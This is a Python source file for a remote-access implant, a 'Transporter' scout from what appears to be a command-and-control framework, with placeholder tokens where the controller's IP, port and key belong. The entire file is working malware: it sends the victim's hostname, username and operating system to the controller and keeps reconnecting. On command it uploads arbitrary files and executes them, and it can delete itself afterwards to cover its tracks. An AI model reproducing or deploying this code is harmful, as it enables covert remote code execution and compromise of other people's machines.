import socket, os, re, pickle, sys
from getpass import getuser
from platform import platform
from time import sleep

port = !!!!!
ip_addr = @@@@@
server_key = #####
End = $$$$$
sid = %%%%%
time_to_sleep = ^^^^^
type_of_scout = 'Transporter'
try:
    operating_sys = platform()
except:
    operating_sys = '?????'
try:
    hostname = socket.gethostname()
except:
    hostname = '?????'
try:
    username = getuser()
except:
    username = '?????'
userinfo = hostname + '/' + username
scout_data = [sid, server_key, userinfo, type_of_scout, operating_sys]
s = None

help_menu = '''\nTransporter Menu
==================

   Global Commands :
      banner                            Display a banner
      clear                             Clear the screen
      help                              Show the help menu
      local <shell command>             Locally execute a shell command
      python                            Enter the system python interpreter
      quit                              Quit the framework

   Connection commands :
      disconnect                        Make the scout disconnect and try to reconnect
      terminate                         Kill the scout process
      sleep <seconds>                   Disconnect the scout and make it sleep for some time

   Handler commands :
      back                              Move back to scout handler

   Scout Commands :
      transport                         Uploads and immediately executes a file
      transport_kill                    Uploads and immediately executes a file before removing itself\n'''

def basename(filepath):
    basename = re.search(r'[^\\/]+(?=[\\/]?$)', filepath)
    if basename:
        return basename.group(0)

def upload_file(file_name, content):
    try:
        f = open(basename(file_name), 'wb')
        f.write(content)
        f.close()
        s.sendall('[+]Uploaded file successfully')
    except Exception as e:
        s.sendall('[-]Error writing to file "' + file_name + '" : ' + str(e))

def recvall(tar_socket):
    tar_socket.settimeout(None)
    data = tar_socket.recv(9999)
    if not data:
        return ''
    while True:
        if data.endswith(End):
            try:
                tar_socket.settimeout(1)
                more_data = tar_socket.recv(9999)
                if not more_data:
                    return data[:-len(End)]
                data += more_data
            except (socket.timeout,socket.error):
                tar_socket.settimeout(None)
                return data[:-len(End)]
        else:
            more_data = tar_socket.recv(9999)
            data += more_data

def main():
    global s
    while True:
        while True:
            try:
                s = socket.socket()
                s.connect((ip_addr, port))
                break
            except:
                sleep(time_to_sleep)
                continue
        s.sendall(pickle.dumps(scout_data) + End)
        while True:
            try:
                #s.settimeout(None)
                data = recvall(s)
                data = data.split(' ', 1)
                command = data[0]
                if command == 'help':
                    s.sendall(help_menu + End)
                elif command == 'disconnect':
                    s.sendall('[*]Disconnecting...' + End)
                    sleep(5)
                    break
                elif command == 'terminate':
                    s.sendall('[*]Terminating scout...' + End)
                    os._exit(1)
                elif command == 'sleep':
                    try:
                        sleep_time = int(data[1])
                    except:
                        s.sendall('[-]Please specify an integer as the sleep duration' + End)
                        continue
                    s.sendall('[*]Scout going offline for : ' + str(sleep_time) + ' seconds' + End)
                    s.shutdown(1)
                    s.close()
                    for i in range(sleep_time):
                        sleep(1)
                    break
                elif command == 'transport':
                    data = data[1].split('|/', 1)
                    file_name = data[0]
                    file_contents = data[1]
                    upload_file(file_name, file_contents)
                    try:
                        os.startfile(file_name)
                        s.sendall('\n|_Succesfully transported and executed file : ' + file_name + End)
                    except Exception as e:
                        s.sendall('\n|_Failed to transport and execute file : ' + str(e) + End)
                elif command == 'transport_kill':
                    data = data[1].split('|/', 1)
                    file_name = data[0]
                    file_contents = data[1]
                    upload_file(file_name, file_contents)
                    try:
                        os.startfile(file_name)
                        s.sendall('\n|_Succesfully transported and executed file, : ' + file_name + '. Deleting transporter...' + End)
                    except Exception as e:
                        s.sendall('\n|_Failed to transport and execute file : ' + str(e) + '. Deleting transporter...' + End)
                    current_name = os.path.basename(sys.argv[0])
                    os.remove(current_name)
                    s.shutdown(1)
                    s.close()
                    os._exit(1)
                elif command == 'ping':
                    s.sendall('[+]Scout is alive' + End)
                else:
                    s.sendall('[-]Unknown command "' + command + '", run "help" for help menu' + End)
            except (socket.error, socket.timeout):
                try:
                    s.shutdown(1)
                    s.close()
                    break
                except socket.error:
                    break
            except Exception as e:
                try:
                    if command:
                        s.sendall('[-]Error, last run command : ' + command + '. Error message : ' + str(e) + End)
                    else:
                        s.sendall('[-]Error message : ' + str(e) + End)
                except:
                    s.shutdown(1)
                    s.close()
                    break

main()
